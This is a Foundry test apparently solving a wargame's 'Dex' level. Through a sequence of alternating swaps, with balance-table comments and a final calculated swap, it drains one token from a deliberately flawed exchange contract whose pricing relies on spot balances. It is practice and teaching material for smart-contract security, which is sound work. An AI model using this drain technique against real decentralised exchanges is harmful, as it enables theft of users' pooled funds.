// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/22_Dex.sol";

contract TestDex is Test {
    address public player = address(0xbad);
    Dex public instance;
    SwappableToken public t1;
    SwappableToken public t2;

    function setUp() public {
        instance = new Dex();
        t1 = new SwappableToken(address(instance), "token1", "T1", 110);
        t2 = new SwappableToken(address(instance), "token2", "T2", 110);
        instance.setTokens(address(t1), address(t2));
        instance.approve(address(instance), 100);
        instance.addLiquidity(address(t1), 100);
        instance.addLiquidity(address(t2), 100);
        t1.transfer(player, 10);
        t2.transfer(player, 10);
    }

    function testSolution() public {
        vm.startPrank(player);

        // DeX        player
        // t1   t2  | t1  t2
        // ---------|--------
        // 100  100 | 10  10
        // 110   90 |  0  20
        //  86  110 | 24   0
        // 110   80 |  0  30
        //  69  110 | 41   0
        // 110   45 |  0  65 -> if I swap 65, the t1 result will be 158, which will pass the existing 110 t1.
        //   0   90 | 110 20    So, we need to calculate how many t2 we need to swap in order to get all the 110 t1.
        //                      (x*110) / 45 = 110 -> (x*110) = 110 * 45 -> x = 45.
        //  1    90 | 109 20    We could have stopped here because we've already drained all t1. But how could we
        //  2     0 | 107 110   optimize our balance? I can donate 1 t1 directly to DeX and then swap 1 t1 to 90 t2.
        instance.approve(address(instance), 110);
        instance.swap(address(t1), address(t2), t1.balanceOf(player));
        instance.swap(address(t2), address(t1), t2.balanceOf(player));
        instance.swap(address(t1), address(t2), t1.balanceOf(player));
        instance.swap(address(t2), address(t1), t2.balanceOf(player));
        instance.swap(address(t1), address(t2), t1.balanceOf(player));
        instance.swap(address(t2), address(t1), 45);
        t1.transfer(address(instance), 1);
        instance.swap(address(t1), address(t2), 1);

        assertTrue((
            t1.balanceOf(address(instance)) == 0 ||
            t2.balanceOf(address(instance)) == 0
        ));

        vm.stopPrank();
    }
}
